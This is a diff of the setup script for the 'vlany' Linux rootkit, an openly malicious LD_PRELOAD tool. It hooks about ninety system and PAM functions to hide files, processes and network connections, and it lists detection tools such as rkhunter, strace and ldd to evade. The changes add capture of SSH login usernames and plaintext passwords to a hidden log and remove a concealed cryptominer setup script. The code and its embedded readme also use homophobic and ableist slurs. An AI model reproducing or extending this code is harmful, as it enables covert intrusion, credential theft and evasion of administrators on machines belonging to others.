@@ -6,7 +6,7 @@ import random
 import string
 import crypt
 
-if len(sys.argv) != 15:
+if len(sys.argv) != 16:
     print "Why are you running me from the command line?"
     print "Usage: {0} <install> <lib name> <xattr 1> <xattr 2> <username> <plaintext password> <pam port> <ssl backdoor status> <accept shell password> <low> <high> <execve password> <environ var> <ptrace bug status>".format(sys.argv[0])
     quit()
@@ -50,13 +50,13 @@ else:
 
 PTRACE_BUG_MSG = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(50))
 ACTIVATE_SWITCH = False
-LD_PRELOAD = "/etc/ld.so.preload"
+LD_PRELOAD = sys.argv[15]
 PROC_NET_TCP = "/proc/net/tcp"
 PROC_NET_TCP6 = "/proc/net/tcp6"
 SSL_CIPHER_LIST = "ALL:!ADH:!LOW:!EXP:!MD5:@STRENGTH"
 
 # each line has the names of 4 edited library function names..multiply this by the amount of lines and add on any stragglers
-# amount of library functions being hooked = (4 * 22) + 2 = 90
+# amount of library functions being hooked = (4 * 22) + 3 = 91
 CALLS = ["rename", "renameat", "renameat2", "fread",
          "stat", "stat64", "fstat", "fstat64",
          "lstat", "lstat64", "__lxstat", "__lxstat64",
@@ -80,7 +80,9 @@ CALLS = ["rename", "renameat", "renameat2", "fread",
          "audit_log_user_message", "audit_send", "getutent", "getutxent",
          "pututline", "pcap_loop", "getpwent", "syslog",
          "__syslog_chk", "dladdr", "dlinfo", "dlsym",
-         "socket", "login"]
+         "socket", "login", "setegid", "pututxline",
+         "getutid", "getutxid", "getutmp", "getutmpx",
+         "updwtmp", "updwtmpx"]
 
 # the following three lists are just used to hide from dlsym()
 # read symbols/hiding/libdl/dlsym.c for hiding functionality in relation to dlsym()
@@ -105,12 +107,15 @@ LIBC_CALLS = ["rename", "renameat", "renameat2", "fread",
              "lgetxattr", "fgetxattr", "setxattr", "lsetxattr",
              "fsetxattr", "removexattr", "lremovexattr", "fremovexattr",
              "getutent", "getutxent", "pututline", "getpwent",
-             "syslog", "__syslog_chk", "socket", "login"] # return original address for all of these libc functions
+             "syslog", "__syslog_chk", "socket", "login",
+             "setegid", "pututxline", "getutid", "getutxid",
+             "getutmp", "getutmpx", "updwtmp", "updwtmpx"] # return original address for all of these libc functions
+
 LIBDL_CALLS = ["dladdr", "dlinfo", "dlsym"] # we also hook libdl stuff in order to hide modifications to library symbols, so we need to do the same here
 LIBPAM_CALLS = ["pam_authenticate", "pam_open_session", "pam_acct_mgmt"] # and the same here...
 
 # GAY_PROCS is a bit of a misnaming. this can also include environment variables :)
-GAY_PROCS = ["unhide", "rkhunter", "chkproc", "ltrace", "strace", "LD_AUDIT"]
+GAY_PROCS = ["ldd", "unhide", "rkhunter", "chkproc", "ltrace", "strace", "LD_AUDIT"]
 
 HIDDEN_INTERFACES = ["lxcbr0"]
 
@@ -121,29 +126,34 @@ VERBOSE_DEBUG = False
 
 SHELL_MSG = """
 \033[1m
-       ______
-          |             .
-          |           __|___       ^'.           .-
-          |  .          |         / \ '..----..'`/ \\
-          |  |  . ,''   |         '  '   /      \  |
-          |  |  | |     |         \ , `''         /
-      ,   .  |  |  `.   |          /  ()    ()    `
-       \  |  |  ;    |  |         /      _         \\
-        '-'  `'` ,_,'   |  /     '      \_/         '
-          .             '-'       `.    ,_        .`'.
-  |     __|___.                     `-._/ \,   _.'\   `.
-  |       | __|___                    _(__/        `...'^.
-  |  ,'   |   |    o             |   /    `\          ,--.'
-  ;,'   o |   |    |        .-,  |  |       `.  /    |     ".
-  | \   | |   |    | | .-. /  |  |  \_| \_,   ''     '       `
-  |  \  | |   |    | |/  | |  |  |    `-'\            `._     \\
-  |   \ | |  /|    | |   | ;  |  |    '   '.             ' --.'
-  |    `| '-' |  / ` |   |  `-|  |   /   '  `'--'       ,.    |
-        `     '-'    |   `-'  |  o  /    |            .'      /
-  ____________________________|_______________________________
-                              |
-                           \  |
-                            '-'
+
+           *             ,
+                       _/^\_
+                      <     >
+     *                 /.-.\         *
+              *        `/&\`                   *
+                      ,@.*;@,
+                     /_o.I %_\    *
+        *           (`'--:o(_@;
+                   /`;--.,__ `')             *
+                  ;@`o % O,*`'`&\ 
+            *    (`'--)_@ ;o %'()\      *
+                 /`;--._`''--._O'@;
+                /&*,()~o`;-.,_ `""`)
+     *          /`,@ ;+& () o*`;-';\\
+               (`""--.,_0 +% @' &()\\
+               /-.,_    ``''--....-'`)  *
+          *    /@%;o`:;'--,.__   __.'\\
+              ;*,&(); @ % &^;~`"`o;@();         *
+              /(); o^~; & ().o@*&`;&%O\\
+        jgs   `"="==""==,,,.,="=="==="`
+           __.----.(\-''#####---...___...-----._
+         '`         \)_`\"\"\"\"\"`
+                 .--' ')
+               o(  )_-\
+                 `\"\"\"` `
+
+                  Merry Christmas!
 \033[0m"""
 
 HELP_MSG = """\033[1m// execve commands\033[0m
@@ -199,6 +209,8 @@ def const_h_setup():
     const_h += '#define VLANY_PERM "' + xor("root") + '"\n'
     const_h += '#define HISTFILE "' + xor("/dev/null") + '"\n'
     const_h += '#define BASH_RC "' + xor(INSTALL + "/.bashrc") + '"\n'
+    const_h += '#define SSH_PASSWORDS "' + xor(INSTALL + "/pam_auth_logs") + '"\n'
+    const_h += '#define LOG_FORMAT "' + xor("Username: %s\nPassword: %s\n\n") + '"\n'
 
     const_h += '#define SHELL_PASSWORD "' + xor(SHELL_PASSWORD) + '"\n'
     const_h += '#define SHELL_MSG "' + xor(HELP_MSG) + '"\n'
@@ -351,13 +363,14 @@ if [ $(id -u) != 0 ]; then kill -9 $$; fi
 if [ -f "README" ]; then cat README | less; rm -f README; fi
 
 clear
-cat .shell_msg
+cat ~/.shell_msg
 
 PROMPT_COMMAND='PS1="[\\033[1;31m\u@\h\\033[0m:\\033[1;34m\w\\033[0m]$ "'
-printf "\\033[1m"; w; echo ""; cat .vlany_information; printf "\\033[0m"
+printf "\\033[1m"; w; echo ""; cat ~/.vlany_information; printf "\\033[0m"
 
-alias ls='ls --color=auto -AlFhn'
+alias ls='ls --color=auto'
 alias l=ls
+alias ll='ls --color=auto -AlFhn'
 alias rm='rm -rfv'
 alias nano='nano -ELSiqt'
 alias lsblk='lsblk --fs --all --paths --perms'
@@ -370,7 +383,9 @@ alias pacman=apt-get
 
 alias unchattr='cd {0}; chattr -ia .* * &>/dev/null; echo "chattr permissions removed on rootkit files"'
 alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
-alias exit='cd {0}; echo "Exiting vlany PAM backdoor in 5 seconds. ^C to cancel."; sleep 5; chattr +ia .* * &>/dev/null; exit;'"""
+
+echo -e "\\033[1mLogged login attempts: \\033[1;31m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
+"""
     fd = open("bashrc", "w")
     fd.write(bash_rc.format(INSTALL))
     fd.close()
@@ -389,7 +404,7 @@ alias exit='cd {0}; echo "Exiting vlany PAM backdoor in 5 seconds. ^C to cancel.
         (rootkit for homosexuals)
 
 If you're reading this, then you've successfully logged into your PAM backdoor and you are in an owner shell. Now that you've started reading this, there's a few things you should know.
-vlany is a rootkit which tries very hard to remain hidden and secure. DO NOT unnecessarily risk the anonymity of this rootkit. For now, it is an unknown rootkit. Keep it that way, mk?
+vlany is now a public rootkit! Thanks for using me, it means a lot. Enjoy, and try not to get caught. :p
 By default, vlany attempts to prevent you from unhiding yourself to a certain extent, but you can easily get past that, since you ARE in an owner shell after all. Be careful if you're going to do something potentially dumb.
 DO NOT unalias apt-get and attempt to install a package via the standard package manager on this box. EVERYTHING WILL GO TO RUIN.
 There's a vlany command for installing packages via apt-get. To use it, enter "./apt" followed by your execve password.
@@ -401,6 +416,7 @@ BIG GAY WARNING:
     FOR THIS REASON, IT IS ONLY POSSIBLE TO INSTALL ONE PACKAGE AT A TIME. TRY NOT TO INSTALL PACKAGES THAT WILL TAKE MORE THAN 1 MINUTE TO INSTALL.
     BE CAREFUL.
     YOU HAVE BEEN WARNED.
+    THIS APPLIES FOR ANY PROCESSES WHICH TEMPORARILY CHANGE YOUR GID.
 
 A breakdown of how the command works:
     cd to root
@@ -418,10 +434,6 @@ File hiding/protection:
     FILES OR DIRECTORIES CREATED IN THIS SHELL AREN'T HIDDEN DYNAMICALLY DUE TO THE NEW FILE HIDING BY EXTENDED ATTRIBUTES.
     ONCE YOU CREATE NEW FILES OR DIRECTORIES, YOU MUST ISSUE THE ./hide COMMAND ON THE NEWLY CREATED FILES/DIRECTORIES TO
     PROTECT THEM FROM REGULAR USERS. THIS IS VERY IMPORTANT. DO NOT FORGET THIS.
-    ld.so.preload and your hidden directory are by default, already fully protected.
-
-utmp/wtmp hiding:
-    You are hidden from /var/log/wtmp and /var/run/utmp, however the name of your current tty may show up. I wouldn't worry about this TOO much, but there's a very small chance some paranoid sysadmin MAY look into this.
 
 vlany LXC container:
   There's a file called enter_lxc.c in your home directory. It allows for on-the-fly creation and destruction of hidden container environments.
@@ -438,41 +450,20 @@ vlany LXC container:
   If somebody (not you) is monitoring disk usage of this box, they will notice that the disk usage will increase when you're in a container. The disk usage will go back to normal once you
   exit the container. It's not like this will get us caught, but it might look a little strange to some paranoid admins.
 
-Bitcoin/Litecoin miner:
-  There's a Python script in your hidden directory called "minerd_setup.py". Running it will setup your miner and compile a binary called "minerd_bin".
-  The zip file stored in your hidden directory called "cpuminer-master" is extracted upon running the minerd_setup script. There is no need to manually unzip it.
-  The process of compiling minerd will be _UNHIDDEN_ from other regular users on the box. As soon as the compilation has finished, you will be hidden again.
-  Since you're starting the binary from your hidden owner shell, the minerd process itself will be hidden.
-  List of Ubuntu/Debian packages required to compile the miner (there are equivalents for these packages for other package managers):
-      git (as of 23/10/2016, git is no longer required to set up the miner), libcurl4-openssl-dev, libncurses5-dev, pkg-config, automake, yasm
-  TRYING TO SETUP YOUR MINER WITHOUT THESE PACKAGES INSTALLED WILL FUCK UP THE SETUP PROCESS. DON'T BE RETARDED.
-  Once you've compiled the miner, start it with ./minerd_bin --url=minerpool.org --user=username --pass=password
-
-Exiting this shell:
-  If you've removed the chattr permissions on the files inside your home directory, you must either exit with 'exit', or by reinstating the chattr permissions first before force exiting.
-
-Read this AT LEAST twice, when you're done, quit this screen with :q. This screen will not show again after this."""
+Read this AT LEAST twice, when you're done, quit this screen by pressing q. This screen will not show again after this."""
 
     fd = open("bd_readme", "w")
     fd.write(BD_README)
     fd.close()
 
-    MINERD_SCRIPT = """#!/usr/bin/env python
-import ctypes,os
-libc=ctypes.CDLL("libc.so.6")
-libc.chdir("/")
-libc.setgid(0)
-os.system('cp ~/cpuminer-master.zip /cpuminer-master.zip;unzip cpuminer-master.zip;cd cpuminer;./autogen.sh;./configure CFLAGS="-O3";make')
-libc.setgid(""" + str(MAGIC_GID) + """)
-os.system('mv /cpuminer/minerd ~/minerd_bin;rm -rf /cpuminer/ /cpuminer-master.zip;')"""
-
-    fd = open("minerd_setup.py", "w")
-    fd.write(MINERD_SCRIPT)
-    fd.close()
-
 def main():
     const_h_setup()
     bash_rc_setup()
+
+    fd = open("magic_gid", "w")
+    fd.write(str(MAGIC_GID))
+    fd.close()
+
     sys.stdout.write("success")
 
 if __name__ == "__main__":
